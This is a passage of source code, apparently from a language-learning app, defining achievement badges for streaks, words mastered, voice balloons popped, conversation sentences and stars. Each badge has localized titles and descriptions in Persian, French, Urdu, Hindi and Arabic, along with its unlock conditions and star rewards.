        badgeTitle: '5 Day Streak',
        localizedTitle: isFa
          ? '۵ روز تمرین پیاپی'
          : isFr
          ? 'Série de 5 Jours'
          : isUr
          ? '5 دن مسلسل سٹریک'
          : isHi
          ? '5 दिन लगातार स्ट्रीक'
          : isAr
          ? 'سلسلة 5 أيام متتالية'
          : '5 Day Streak',
        description: isFa
          ? 'به مدت ۵ روز متوالی تمرین روزانه یادگیری زبان را تکمیل کنید.'
          : isFr
          ? 'Maintenez une série d’apprentissage quotidienne active pendant 5 jours consécutifs.'
          : isUr
          ? 'لگاتار 5 دن تک روزانہ زبان سیکھنے کی مشق مکمل کریں۔'
          : isHi
          ? 'लगातार 5 दिनों तक रोज़ाना भाषा सीखने का अभ्यास पूरा करें।'
          : isAr
          ? 'أكمل تدريب تعلم اللغة يومياً لمدة 5 أيام متتالية.'
          : 'Maintain an active daily learning streak for 5 consecutive days.',
        current: Math.min(5, Math.max(0, streakDays)),
        target: 5,
        unit: isFa ? 'روز' : isFr ? 'jours' : isUr ? 'دن' : isHi ? 'दिन' : isAr ? 'أيام' : 'days',
        unlocked: streakDays >= 5,
        rewardStars: 25,
      },
      {
        id: 'certified_scholar',
        icon: '🎓',
        emblemKind: 'certificate' as const,
        emblemGradient: 'from-yellow-400 via-amber-500 to-indigo-600',
        tierLabel: isUr
          ? 'اعلیٰ اعزاز'
          : isHi
          ? 'सर्वोच्च सम्मान'
          : isAr
          ? 'الوسام الذهبي'
          : 'Grand Honor',
        badgeTitle: 'First Certificate Earned',
        localizedTitle: isFa
          ? 'کسب اولین گواهینامه رسمی'
          : isFr
          ? 'Premier Certificat Obtenu'
          : isUr
          ? 'پہلا آفیشل سرٹیفکیٹ حاصل کیا'
          : isHi
          ? 'पहला आधिकारिक सर्टिफिकेट प्राप्त किया'
          : isAr
          ? 'الحصول على أول شهادة رسمية'
          : 'First Certificate Earned',
        description: isFa
          ? 'هر ۲ مرحله (واژگان و مکالمه) را کامل کنید تا اولین گواهینامه رسمی خود را دریافت کنید.'
          : isFr
          ? 'Complétez les étapes Mots et Conversation pour obtenir votre premier certificat officiel.'
          : isUr
          ? 'الفاظ اور بات چیت کے دونوں مراحل مکمل کر کے اپنا پہلا آفیشل سرٹیفکیٹ حاصل کریں۔'
          : isHi
          ? 'शब्द और बातचीत के दोनों चरण पूरे करके अपना पहला आधिकारिक प्रमाणपत्र प्राप्त करें।'
          : isAr
          ? 'أكمل مرحلتي الكلمات والمحادثة واحصل على شهادتك الرسمية الأولى.'
          : 'Complete both Words & Conversation stages to earn your first official certificate.',
        current:
          (wordsCompleted >= wordsTotal && wordsTotal > 0 ? 1 : 0) +
          (courseCompleted ? 1 : 0),
        target: 2,
        unit: isFa ? 'مرحله' : isFr ? 'étapes' : isUr ? 'مراحل' : isHi ? 'चरण' : isAr ? 'مراحل' : 'stages',
        unlocked: courseCompleted,
        rewardStars: 100,
      },
      {
        id: 'balloons_25',
        icon: '🎯',
        emblemKind: 'balloons' as const,
        emblemGradient: 'from-sky-400 via-blue-500 to-indigo-600',
        tierLabel: isUr ? 'آواز کا ماہر' : isHi ? 'वॉइस स्टार' : isAr ? 'نجم الصوت' : 'Voice Starter',
        badgeTitle: 'First 25 Balloons Popped',
        localizedTitle: isFa
          ? '۲۵ بادکنک اول'
          : isFr
          ? '25 Premiers Ballons'
          : isUr
          ? 'پہلے 25 غبارے پاپ کیے'
          : isHi
          ? 'पहले 25 गुब्बारे फोड़े'
          : isAr
          ? 'أول 25 بالون'
          : 'First 25 Balloons Popped',
        description: isFa
          ? 'سفر یادگیری خود را با ترکاندن ۲۵ بادکنک اول آغاز کنید.'
          : isFr
          ? 'Commencez votre aventure en éclatant vos 25 premiers ballons vocaux.'
          : isUr
          ? 'اپنے سفر کا شاندار آغاز کرتے ہوئے پہلے 25 غبارے کامیابی سے پاپ کریں۔'
          : isHi
          ? 'अपनी यात्रा की शानदार शुरुआत करते हुए पहले 25 गुब्बारे फोड़ें।'
          : isAr
          ? 'ابدأ رحلتك بنجاح وفرقع أول 25 بالون.'
          : 'Kick off your language adventure by popping your first 25 voice balloons.',
        current: Math.min(25, totalBalloonsPoppedUser),
        target: 25,
        unit: isFa ? 'بادکنک' : isFr ? 'ballons' : isUr ? 'غبارے' : isHi ? 'गुब्बारे' : isAr ? 'بالون' : 'balloons',
        unlocked: totalBalloonsPoppedUser >= 25,
        rewardStars: 15,
      },
      {
        id: 'words_50',
        icon: '🍎',
        emblemKind: 'words' as const,
        emblemGradient: 'from-emerald-500 via-green-600 to-teal-700',
        tierLabel: isUr ? 'ذخیرۂ الفاظ' : isHi ? 'शब्दकोश मास्टर' : isAr ? 'خبير المفردات' : 'Vocab Scholar',
        badgeTitle: '50 Words Mastered',
        localizedTitle: isFa
          ? 'تسلط بر ۵۰ واژه'
          : isFr
          ? '50 Mots Maîtrisés'
          : isUr
          ? '50 الفاظ میں مہارت'
          : isHi
          ? '50 शब्दों में महारत'
          : isAr
          ? 'إتقان 50 كلمة'
          : '50 Words Mastered',
        description: isFa
          ? '۵۰ واژه و عبارت کاربردی را با تلفظ صحیح بیاموزید.'
          : isFr
          ? 'Maîtrisez 50 mots de vocabulaire et expressions avec une prononciation précise.'
          : isUr
          ? 'درست تلفظ کے ساتھ 50 الفاظ اور جملوں کے ذخیرۂ الفاظ میں مہارت حاصل کریں۔'
          : isHi
          ? 'सही उच्चारण के साथ 50 शब्दों और वाक्यों की शब्दावली में महारत हासिल करें।'
          : isAr
          ? 'أتقن 50 كلمة وعبارة بنطق واضح وصحيح.'
          : 'Master 50 vocabulary words and essential expressions with accurate pronunciation.',
        current: Math.min(50, effectiveWordsMasteredUser),
        target: 50,
        unit: isFa ? 'واژه' : isFr ? 'mots' : isUr ? 'الفاظ' : isHi ? 'शब्द' : isAr ? 'كلمات' : 'words',
        unlocked:
          effectiveWordsMasteredUser >= 50 ||
          (wordsCompleted >= wordsTotal && wordsTotal > 0),
        rewardStars: 40,
      },
      {
        id: 'traveler_topics_10',
        icon: '✈️',
        emblemKind: 'travel' as const,
        emblemGradient: 'from-purple-500 via-indigo-500 to-blue-600',
        tierLabel: isUr ? 'عالمی مسافر' : isHi ? 'ग्लोबल ट्रैवलर' : isAr ? 'مسافر عالمي' : 'Global Explorer',
        badgeTitle: 'Traveler to Local Explorer (10 Topics)',
        localizedTitle: isFa
          ? 'مسافر تا شهروند محلی (۱۰ موضوع)'
          : isFr
          ? 'Explorateur Voyageur (10 Sujets)'
          : isUr
          ? 'مسافر سے مقامی ماہر (10 ٹاپکس)'
          : isHi
          ? 'ट्रैवलर से लोकल एक्सपर्ट (10 टॉपिक्स)'
          : isAr
          ? 'من مسافر إلى متحدث محلي (10 مواضيع)'
          : 'Traveler to Local Explorer (10 Topics)',
        description: isFa
          ? '۱۰ موضوع مکالمه از فرودگاه و سفر تا زندگی روزمره را تکمیل کنید.'
          : isFr
          ? 'Complétez 10 sujets de conversation du voyageur au résident local.'
          : isUr
          ? 'ایئرپورٹ اور سفر سے لے کر مقامی رہائشی بننے تک 10 گفتگو کے ٹاپکس مکمل کریں۔'
          : isHi
          ? 'एयरपोर्ट और यात्रा से लेकर स्थानीय निवासी की तरह बोलने तक 10 बातचीत के टॉपिक्स पूरे करें।'
          : isAr
          ? 'أكمل 10 مواضيع محادثة من السفر والمطار إلى التحدث كمقيم محلي.'
          : 'Complete 10 Traveler-to-Resident conversation topics with natural fluency.',
        current: Math.min(10, Math.max(0, Math.floor(conversationsCompleted / 5))),
        target: 10,
        unit: isFa ? 'موضوع' : isFr ? 'sujets' : isUr ? 'ٹاپکس' : isHi ? 'टॉपिक्स' : isAr ? 'مواضيع' : 'topics',
        unlocked:
          conversationsCompleted >= 50 ||
          adminUnlockedTopicsCount >= 10 ||
          courseCompleted,
        rewardStars: 30,
      },
      {
        id: 'streak_14',
        icon: '⚡',
        emblemKind: 'streak' as const,
        emblemGradient: 'from-orange-500 via-rose-500 to-red-600',
        tierLabel: isUr ? 'مستقل مزاج' : isHi ? 'निरंतर अभ्यास' : isAr ? 'مثابرة ذهبية' : 'Elite Consistency',
        badgeTitle: '14 Day Streak Champion',
        localizedTitle: isFa
          ? 'قهرمان ۱۴ روز پیاپی'
          : isFr
          ? 'Champion 14 Jours'
          : isUr
          ? '14 دن کا سٹریک چیمپئن'
          : isHi
          ? '14 दिन स्ट्रीक चैंपियन'
          : isAr
          ? 'بطل سلسلة 14 يوماً'
          : '14 Day Streak Champion',
        description: isFa
          ? 'به مدت ۲ هفته متوالی (۱۴ روز) هر روز تمرین کنید.'
          : isFr
          ? 'Restez régulier pendant deux semaines complètes avec une série de 14 jours.'
          : isUr
          ? 'مسلسل 2 ہفتے (14 دن) تک روزانہ سیکھنے کا ریکارڈ برقرار رکھیں۔'
          : isHi
          ? 'लगातार 2 सप्ताह (14 दिन) तक रोज़ाना सीखने का रिकॉर्ड बनाए रखें।'
          : isAr
          ? 'حافظ على سجل التعلم اليومي لمدة أسبوعين متتاليين (14 يوماً).'
          : 'Stay consistent for two full weeks with a 14-day learning streak.',
        current: Math.min(14, Math.max(0, streakDays)),
        target: 14,
        unit: isFa ? 'روز' : isFr ? 'jours' : isUr ? 'دن' : isHi ? 'दिन' : isAr ? 'أيام' : 'days',
        unlocked: streakDays >= 14,
        rewardStars: 50,
      },
      {
        id: 'conversation_20',
        icon: '💬',
        emblemKind: 'conversation' as const,
        emblemGradient: 'from-violet-500 via-purple-600 to-fuchsia-600',
        tierLabel: isUr ? 'روانی سے گفتگو' : isHi ? 'धाराप्रवाह वक्ता' : isAr ? 'متحدث طليق' : 'Fluency Badge',
        badgeTitle: 'Fluent Speaker (20 Sentences)',
        localizedTitle: isFa
          ? 'سخنور روان (۲۰ جمله)'
          : isFr
          ? 'Orateur Fluide (20 Phrases)'
          : isUr
          ? 'بات چیت کا ماہر (20 جملے)'
          : isHi
          ? 'बातचीत में माहिर (20 वाक्य)'
          : isAr
          ? 'متحدث طليق (20 جملة محادثة)'
          : 'Fluent Speaker (20 Sentences)',
        description: isFa
          ? '۲۰ جمله کامل را در مرحله مکالمه بیان یا مرتب کنید.'
          : isFr
          ? 'Prononcez ou assemblez 20 phrases complètes dans l’étape Conversation.'
          : isUr
          ? 'بات چیت کے مرحلے میں 20 مکمل جملے بول کر یا جوڑ کر مکمل کریں۔'
          : isHi
          ? 'बातचीत के चरण में 20 पूरे वाक्य बोलकर या जोड़कर पूरे करें।'
          : isAr
          ? 'أكمل 20 جملة محادثة كاملة في المرحلة الثالثة.'
          : 'Speak or assemble 20 real-life sentences in the Conversation stage.',
        current: Math.min(20, conversationsCompleted),
        target: 20,
        unit: isFa ? 'جمله' : isFr ? 'phrases' : isUr ? 'جملے' : isHi ? 'वाक्य' : isAr ? 'جمل' : 'sentences',
        unlocked: conversationsCompleted >= 20 || courseCompleted,
        rewardStars: 45,
      },
      {
        id: 'balloons_100',
        icon: '🎈',
        emblemKind: 'balloons' as const,
        emblemGradient: 'from-cyan-400 via-sky-500 to-blue-700',
        tierLabel: isUr ? 'سنچری چیمپئن' : isHi ? 'सेंचुरी चैंपियन' : isAr ? 'بطل المئوية' : 'Century Master',
        badgeTitle: '100 Balloons Popped',
        localizedTitle: isFa
          ? 'ترکاندن ۱۰۰ بادکنک'
          : isFr
          ? '100 Ballons Éclatés'
          : isUr
          ? '100 غبارے پاپ کیے'
          : isHi
          ? '100 गुब्बारे फोड़े'
          : isAr
          ? 'فرقعة 100 بالون'
          : '100 Balloons Popped',
        description: isFa
          ? 'در مراحل واژگان و مکالمه با صدای خود ۱۰۰ بادکنک بترکانید.'
          : isFr
          ? 'Éclatez 100 ballons avec votre voix dans les étapes Mots et Conversation.'
          : isUr
          ? 'الفاظ اور بات چیت کے مراحل میں اپنی آواز سے 100 غبارے پاپ کریں۔'
          : isHi
          ? 'शब्द और बातचीत के चरणों में अपनी आवाज़ से 100 गुब्बारे फोड़ें।'
          : isAr
          ? 'فرقع 100 بالون بصوتك عبر مراحل الكلمات والمحادثة.'
          : 'Pop 100 balloons using your voice across Words and Conversation stages.',
        current: Math.min(100, totalBalloonsPoppedUser),
        target: 100,
        unit: isFa ? 'بادکنک' : isFr ? 'ballons' : isUr ? 'غبارے' : isHi ? 'गुब्बारे' : isAr ? 'بالون' : 'balloons',
        unlocked: totalBalloonsPoppedUser >= 100 || courseCompleted,
        rewardStars: 50,
      },
      {
        id: 'first_word',
        icon: '🎙️',
        emblemKind: 'words' as const,
        emblemGradient: 'from-sky-400 via-blue-500 to-indigo-600',
        tierLabel: isUr
          ? 'پہلا قدم'
          : isHi
          ? 'पहला कदम'
          : isAr
          ? 'الخطوة الأولى'
          : 'First Step',
        badgeTitle: 'First Word Spoken',
        localizedTitle: isFa
          ? 'اولین واژه بیان‌شده'
          : isFr
          ? 'Premier Mot Prononcé'
          : isUr
          ? 'پہلا لفظ کامیابی سے بولا'
          : isHi
          ? 'पहला शब्द सफलतापूर्वक बोला'
          : isAr
          ? 'نطق أول كلمة بنجاح'
          : 'First Word Spoken',
        description: isFa
          ? 'اولین واژه خود را با میکروفون تلفظ کنید و بادکنک را بترکانید.'
          : isFr
          ? 'Prononcez votre tout premier mot au microphone et éclatez le ballon.'
          : isUr
          ? 'مائیکروفون میں اپنا پہلا لفظ درست تلفظ کے ساتھ بول کر غبارہ پاپ کریں۔'
          : isHi
          ? 'माइक्रोफ़ोन में अपना पहला शब्द सही उच्चारण के साथ बोलकर गुब्बारा फोड़ें।'
          : isAr
          ? 'انطق كلمتك الأولى في الميكروفون وفرقع البالون.'
          : 'Speak your very first word into the microphone and pop your first balloon.',
        current: Math.min(1, effectiveWordsMasteredUser),
        target: 1,
        unit: isFa ? 'واژه' : isFr ? 'mot' : isUr ? 'لفظ' : isHi ? 'शब्द' : isAr ? 'كلمة' : 'word',
        unlocked: effectiveWordsMasteredUser >= 1 || wordsCompleted >= 1,
        rewardStars: 10,
      },
      {
        id: 'words_25',
        icon: '📗',
        emblemKind: 'words' as const,
        emblemGradient: 'from-teal-400 via-emerald-500 to-green-600',
        tierLabel: isUr
          ? 'الفاظ کا کھوجی'
          : isHi
          ? 'शब्द एक्सप्लोरर'
          : isAr
          ? 'مستكشف الكلمات'
          : 'Word Explorer',
        badgeTitle: '25 Words Mastered',
        localizedTitle: isFa
          ? 'تسلط بر ۲۵ واژه'
          : isFr
          ? '25 Mots Maîtrisés'
          : isUr
          ? '25 الفاظ میں مہارت'
          : isHi
          ? '25 शब्दों में महारत'
          : isAr
          ? 'إتقان 25 كلمة'
          : '25 Words Mastered',
        description: isFa
          ? '۲۵ واژه کاربردی را با تلفظ صحیح یاد بگیرید.'
          : isFr
          ? 'Maîtrisez 25 mots essentiels avec une prononciation claire.'
          : isUr
          ? 'روزمرہ زندگی کے 25 اہم الفاظ درست تلفظ کے ساتھ سیکھیں۔'
          : isHi
          ? 'रोज़मर्रा की ज़िंदगी के 25 महत्वपूर्ण शब्द सही उच्चारण के साथ सीखें।'
          : isAr
          ? 'أتقن 25 كلمة أساسية بنطق واضح وصحيح.'
          : 'Master 25 essential everyday vocabulary words with clear pronunciation.',
        current: Math.min(25, effectiveWordsMasteredUser),
        target: 25,
        unit: isFa ? 'واژه' : isFr ? 'mots' : isUr ? 'الفاظ' : isHi ? 'शब्द' : isAr ? 'كلمات' : 'words',
        unlocked: effectiveWordsMasteredUser >= 25 || wordsCompleted >= 25,
        rewardStars: 30,
      },
      {
        id: 'words_100',
        icon: '👑',
        emblemKind: 'words' as const,
        emblemGradient: 'from-emerald-500 via-teal-600 to-indigo-700',
        tierLabel: isUr
          ? 'لغت کا بادشاہ'
          : isHi
          ? 'वोकैबुलरी लीजेंड'
          : isAr
          ? 'أسطورة المفردات'
          : 'Vocabulary Legend',
        badgeTitle: '100 Words Vocabulary Legend',
        localizedTitle: isFa
          ? 'قهرمان ۱۰۰ واژه کامل'
          : isFr
          ? 'Légende des 100 Mots'
          : isUr
          ? '100 الفاظ کا مکمل ماہر'
          : isHi
          ? '100 शब्दों का पूर्ण मास्टर'
          : isAr
          ? 'بطل الـ 100 كلمة كاملة'
          : '100 Words Vocabulary Legend',
        description: isFa
          ? 'هر ۱۰۰ واژه مرحله اول را به طور کامل به پایان برسانید.'
          : isFr
          ? 'Complétez l’intégralité des 100 mots de vocabulaire.'
          : isUr
          ? 'پہلے مرحلے کے تمام 100 الفاظ مکمل کر کے ووکبلری لیجنڈ بنیں۔'
          : isHi
          ? 'पहले चरण के सभी 100 शब्द पूरे करके वोकैबुलरी लीजेंड बनें।'
          : isAr
          ? 'أكمل جميع الكلمات الـ 100 في المرحلة الأولى.'
          : 'Complete all 100 vocabulary words in Stage 1 to become a Vocabulary Legend.',
        current: Math.min(100, effectiveWordsMasteredUser),
        target: 100,
        unit: isFa ? 'واژه' : isFr ? 'mots' : isUr ? 'الفاظ' : isHi ? 'शब्द' : isAr ? 'كلمات' : 'words',
        unlocked:
          effectiveWordsMasteredUser >= 100 ||
          (wordsCompleted >= wordsTotal && wordsTotal > 0),
        rewardStars: 80,
      },
      {
        id: 'streak_3',
        icon: '🕯️',
        emblemKind: 'streak' as const,
        emblemGradient: 'from-yellow-400 via-amber-500 to-orange-500',
        tierLabel: isUr
          ? 'آغازِ تسلسل'
          : isHi
          ? 'स्ट्रीक स्टार्टर'
          : isAr
          ? 'بداية الاستمرارية'
          : 'Streak Starter',
        badgeTitle: '3 Day Streak Starter',
        localizedTitle: isFa
          ? '۳ روز تمرین متوالی'
          : isFr
          ? 'Série de 3 Jours'
          : isUr
          ? '3 دن مسلسل اسٹریک'
          : isHi
          ? '3 दिन लगातार स्ट्रीक'
          : isAr
          ? 'سلسلة 3 أيام متتالية'
          : '3 Day Streak Starter',
        description: isFa
          ? 'به مدت ۳ روز پیاپی تمرین روزانه خود را ادامه دهید.'
          : isFr
          ? 'Pratiquez pendant 3 jours consécutifs sans interruption.'
          : isUr
          ? 'لگاتار 3 دن تک روزانہ زبان سیکھنے کی عادت بنائیں۔'
          : isHi
          ? 'लगातार 3 दिनों तक रोज़ाना भाषा सीखने की आदत बनाएं।'
          : isAr
          ? 'واظب على التعلم لمدة 3 أيام متتالية.'
          : 'Build your daily learning habit by practicing for 3 consecutive days.',
        current: Math.min(3, Math.max(0, streakDays)),
        target: 3,
        unit: isFa ? 'روز' : isFr ? 'jours' : isUr ? 'دن' : isHi ? 'दिन' : isAr ? 'أيام' : 'days',
        unlocked: streakDays >= 3,
        rewardStars: 15,
      },
      {
        id: 'streak_7',
        icon: '🔥',
        emblemKind: 'streak' as const,
        emblemGradient: 'from-orange-400 via-red-500 to-rose-600',
        tierLabel: isUr
          ? 'ہفتہ وار چیمپئن'
          : isHi
          ? 'वीकली वॉरियर'
          : isAr
          ? 'بطل الأسبوع'
          : 'Weekly Warrior',
        badgeTitle: '7 Day Weekly Streak',
        localizedTitle: isFa
          ? 'قهرمان هفته (۷ روز پیاپی)'
          : isFr
          ? 'Guerrier Hebdomadaire (7 Jours)'
          : isUr
          ? '7 دن (پورا ہفتہ) مسلسل اسٹریک'
          : isHi
          ? '7 दिन (पूरा सप्ताह) स्ट्रीक'
          : isAr
          ? 'سلسلة أسبوع كامل (7 أيام)'
          : '7 Day Weekly Streak',
        description: isFa
          ? 'یک هفته کامل (۷ روز متوالی) بدون وقفه تمرین کنید.'
          : isFr
          ? 'Complétez une semaine entière de 7 jours d’apprentissage continu.'
          : isUr
          ? 'پورا ایک ہفتہ (7 دن مسلسل) بغیر ناغہ سیکھنے کا ہدف مکمل کریں۔'
          : isHi
          ? 'पूरा एक सप्ताह (7 दिन लगातार) बिना रुके सीखने का लक्ष्य पूरा करें।'
          : isAr
          ? 'أكمل أسبوعاً كاملاً (7 أيام متتالية) من التعلم المستمر.'
          : 'Complete a full 7-day week of uninterrupted daily language practice.',
        current: Math.min(7, Math.max(0, streakDays)),
        target: 7,
        unit: isFa ? 'روز' : isFr ? 'jours' : isUr ? 'دن' : isHi ? 'दिन' : isAr ? 'أيام' : 'days',
        unlocked: streakDays >= 7,
        rewardStars: 35,
      },
      {
        id: 'streak_30',
        icon: '🏆',
        emblemKind: 'streak' as const,
        emblemGradient: 'from-rose-500 via-amber-500 to-yellow-500',
        tierLabel: isUr
          ? 'ماہانہ لیجنڈ'
          : isHi
          ? 'मंथली लीजेंड'
          : isAr
          ? 'أسطورة الشهر'
          : 'Monthly Legend',
        badgeTitle: '30 Day Monthly Master',
        localizedTitle: isFa
          ? 'استاد ۳۰ روز متوالی'
          : isFr
          ? 'Maître des 30 Jours'
          : isUr
          ? '30 دن کا ماہانہ اسٹریک ماسٹر'
          : isHi
          ? '30 दिन का मंथली स्ट्रीक मास्टर'
          : isAr
          ? 'بطل الـ 30 يوماً المتتالية'
          : '30 Day Monthly Master',
        description: isFa
          ? 'یک ماه کامل (۳۰ روز پیاپی) تمرین روزانه زبان را حفظ کنید.'
          : isFr
          ? 'Maintenez votre série d’apprentissage pendant 30 jours complets.'
          : isUr
          ? 'مسلسل 30 دن تک روزانہ مشق کر کے ماہانہ اسٹریک ماسٹر کا اعزاز جیتیں۔'
          : isHi
          ? 'लगातार 30 दिनों तक अभ्यास करके मंथली स्ट्रीक मास्टर का खिताब जीतें।'
          : isAr
          ? 'حافظ على سلسلة التعلم لمدة 30 يوماً متتالياً.'
          : 'Maintain an unstoppable 30-day learning streak for a full month.',
        current: Math.min(30, Math.max(0, streakDays)),
        target: 30,
        unit: isFa ? 'روز' : isFr ? 'jours' : isUr ? 'دن' : isHi ? 'दिन' : isAr ? 'أيام' : 'days',
        unlocked: streakDays >= 30,
        rewardStars: 100,
      },
      {
        id: 'balloons_250',
        icon: '🚀',
        emblemKind: 'balloons' as const,
        emblemGradient: 'from-indigo-500 via-purple-600 to-pink-600',
        tierLabel: isUr
          ? 'آواز کا سلطان'
          : isHi
          ? 'वॉइस उस्ताद'
          : isAr
          ? 'مايسترو الصوت'
          : 'Voice Maestro',
        badgeTitle: '250 Balloons Voice Maestro',
        localizedTitle: isFa
          ? 'استاد صدا (۲۵۰ بادکنک)'
          : isFr
          ? 'Maestro Vocal (250 Ballons)'
          : isUr
          ? '250 غبارے پاپ کرنے والا ماہر'
          : isHi
          ? '250 गुब्बारे फोड़ने वाला उस्ताद'
          : isAr
          ? 'فرقع 250 بالون صوتي'
          : '250 Balloons Voice Maestro',
        description: isFa
          ? 'با تلفظ عالی ۲۵۰ بادکنک را در مراحل مختلف بترکانید.'
          : isFr
          ? 'Éclatez 250 ballons vocaux avec une prononciation parfaite.'
          : isUr
          ? 'اپنی صاف اور درست آواز سے مجموعی طور پر 250 غبارے پاپ کریں۔'
          : isHi
          ? 'अपनी साफ़ और सही आवाज़ से कुल 250 गुब्बारे फोड़ें।'
          : isAr
          ? 'فرقع 250 بالوناً بصوتك الواضح والصحيح.'
          : 'Pop 250 voice balloons across all stages with clear pronunciation.',
        current: Math.min(250, totalBalloonsPoppedUser),
        target: 250,
        unit: isFa ? 'بادکنک' : isFr ? 'ballons' : isUr ? 'غبارے' : isHi ? 'गुब्बारे' : isAr ? 'بالون' : 'balloons',
        unlocked: totalBalloonsPoppedUser >= 250 || courseCompleted,
        rewardStars: 90,
      },
      {
        id: 'conversation_50',
        icon: '🗣️',
        emblemKind: 'conversation' as const,
        emblemGradient: 'from-fuchsia-500 via-purple-600 to-indigo-700',
        tierLabel: isUr
          ? 'مکالمہ ماسٹر'
          : isHi
          ? 'डायलॉग मास्टर'
          : isAr
          ? 'خبير الحوار'
          : 'Dialogue Master',
        badgeTitle: 'Dialogue Master (50 Sentences)',
        localizedTitle: isFa
          ? 'استاد مکالمه (۵۰ جمله)'
          : isFr
          ? 'Maître du Dialogue (50 Phrases)'
          : isUr
          ? 'مکالمے کا ماہر (50 جملے)'
          : isHi
          ? 'संवाद मास्टर (50 वाक्य)'
          : isAr
          ? 'خبير المحادثة (50 جملة)'
          : 'Dialogue Master (50 Sentences)',
        description: isFa
          ? '۵۰ جمله کاربردی را در مرحله مکالمه با موفقیت کامل کنید.'
          : isFr
          ? 'Complétez 50 phrases de conversation de la vie réelle.'
          : isUr
          ? 'بات چیت کے مرحلے میں 50 حقیقی زندگی کے جملے کامیابی سے مکمل کریں۔'
          : isHi
          ? 'बातचीत के चरण में 50 वास्तविक जीवन के वाक्य सफलतापूर्वक पूरे करें।'
          : isAr
          ? 'أكمل 50 جملة محادثة واقعية بنجاح.'
          : 'Master 50 real-world conversation sentences with confidence.',
        current: Math.min(50, conversationsCompleted),
        target: 50,
        unit: isFa ? 'جمله' : isFr ? 'phrases' : isUr ? 'جملے' : isHi ? 'वाक्य' : isAr ? 'جمل' : 'sentences',
        unlocked: conversationsCompleted >= 50 || courseCompleted,
        rewardStars: 75,
      },
      {
        id: 'stars_500',
        icon: '⭐',
        emblemKind: 'stars' as const,
        emblemGradient: 'from-amber-300 via-yellow-500 to-orange-600',
        tierLabel: isUr ? 'گولڈن اسٹار' : isHi ? 'गोल्डन स्टार' : isAr ? 'النجمة الذهبية' : 'Gold Legend',
        badgeTitle: '500 Stars Champion',
        localizedTitle: isFa
          ? 'قهرمان ۵۰۰ ستاره'
          : isFr
          ? 'Champion 500 Étoiles'
          : isUr
          ? '500 ستاروں کا فاتح'
          : isHi
          ? '500 सितारों का विजेता'
          : isAr
          ? 'جامع 500 نجمة'
          : '500 Stars Champion',
        description: isFa
          ? 'با تلفظ صحیح و تمرین مستمر ۵۰۰ ستاره طلایی کسب کنید.'
          : isFr
          ? 'Gagnez 500 étoiles dorées grâce à une prononciation précise.'
          : isUr
          ? 'درست تلفظ اور مشق کے ذریعے 500 سنہری ستارے حاصل کریں۔'
          : isHi
          ? 'सही उच्चारण और अभ्यास के माध्यम से 500 सुनहरे सितारे अर्जित करें।'
          : isAr
          ? 'اجمع 500 نجمة ذهبية من خلال النطق الصحيح والتدريب.'
          : 'Earn 500 golden stars through accurate pronunciation and balloon challenges.',
        current: Math.min(500, Math.max(0, stars)),
        target: 500,
        unit: isFa ? 'ستاره' : isFr ? 'étoiles' : isUr ? 'ستارے' : isHi ? 'सितारे' : isAr ? 'نجوم' : 'stars',
        unlocked: stars >= 500,
        rewardStars: 60,
      },
      {
        id: 'stars_1000',
        icon: '🌟',
        emblemKind: 'stars' as const,
        emblemGradient: 'from-yellow-400 via-amber-500 to-rose-600',
        tierLabel: isUr
          ? 'گرانڈ اسٹار چیمپئن'
          : isHi
          ? 'ग्रैंड स्टार चैंपियन'
          : isAr
          ? 'بطل الـ 1000 نجمة'
          : 'Grand Star Legend',
        badgeTitle: '1000 Stars Grand Champion',
        localizedTitle: isFa
          ? 'قهرمان بزرگ ۱۰۰۰ ستاره'
          : isFr
          ? 'Grand Champion 1000 Étoiles'
          : isUr
          ? '1000 ستاروں کا عظیم فاتح'
          : isHi
          ? '1000 सितारों का महाविजेता'
          : isAr
          ? 'البطل الكبير لـ 1000 نجمة'
          : '1000 Stars Grand Champion',
        description: isFa
          ? 'به رکورد درخشان ۱۰۰۰ ستاره طلایی دست پیدا کنید.'
          : isFr
          ? 'Atteignez le sommet prestigieux de 1000 étoiles dorées.'
          : isUr
          ? 'شاندار محنت اور روزانہ بونس کے ذریعے 1000 سنہری ستارے مکمل کریں۔'
          : isHi
          ? 'शानदार मेहनत और डेली बोनस के ज़रिए 1000 सुनहरे सितारे पूरे करें।'
          : isAr
          ? 'صل إلى القمة بجمع 1000 نجمة ذهبية.'
          : 'Reach the prestigious milestone of 1,000 golden stars.',
        current: Math.min(1000, Math.max(0, stars)),
        target: 1000,
        unit: isFa ? 'ستاره' : isFr ? 'étoiles' : isUr ? 'ستارے' : isHi ? 'सितारे' : isAr ? 'نجوم' : 'stars',
        unlocked: stars >= 1000,
        rewardStars: 120,
      },
      {
        id: 'words_5',
        icon: '🌱',
        emblemKind: 'words' as const,
        emblemGradient: 'from-cyan-400 via-sky-500 to-blue-600',
        tierLabel: isUr
          ? 'ابتدائی الفاظ'
          : isHi
          ? 'शुरुआती शब्द'
          : isAr
          ? 'بداية المفردات'
          : 'Vocab Starter',
        badgeTitle: 'First 5 Words Spoken',
        localizedTitle: isFa
          ? '۵ واژه اول'
          : isFr
          ? '5 Premiers Mots'
          : isUr
          ? 'پہلے 5 الفاظ میں مہارت'
          : isHi
          ? 'पहले 5 शब्दों में महारत'
          : isAr
          ? 'إتقان أول 5 كلمات'
          : 'First 5 Words Spoken',
        description: isFa
          ? '۵ واژه اول را با صدای واضح در میکروفون تمرین کنید.'
          : isFr
          ? 'Prononcez vos 5 premiers mots avec succès.'
          : isUr
          ? 'اپنے پہلے 5 الفاظ درست تلفظ کے ساتھ بول کر غبارے پاپ کریں۔'
          : isHi
          ? 'अपने पहले 5 शब्द सही उच्चारण के साथ बोलकर गुब्बारे फोड़ें।'
          : isAr
          ? 'انطق أول 5 كلمات بنجاح وفرقع البالونات.'
          : 'Speak and master your first 5 vocabulary words with clear pronunciation.',
        current: Math.min(5, effectiveWordsMasteredUser),
        target: 5,
        unit: isFa ? 'واژه' : isFr ? 'mots' : isUr ? 'الفاظ' : isHi ? 'शब्द' : isAr ? 'كلمات' : 'words',
        unlocked: effectiveWordsMasteredUser >= 5 || wordsCompleted >= 5,
        rewardStars: 15,
      },
      {
        id: 'words_75',
        icon: '📚',
        emblemKind: 'words' as const,
        emblemGradient: 'from-emerald-400 via-teal-600 to-cyan-700',
        tierLabel: isUr
          ? 'ایڈوانس ذخیرۂ الفاظ'
          : isHi
          ? 'एडवांस शब्दकोश'
          : isAr
          ? 'مفردات متقدمة'
          : 'Advanced Scholar',
        badgeTitle: '75 Words Mastered',
        localizedTitle: isFa
          ? 'تسلط بر ۷۵ واژه'
          : isFr
          ? '75 Mots Maîtrisés'
          : isUr
          ? '75 الفاظ میں مہارت'
          : isHi
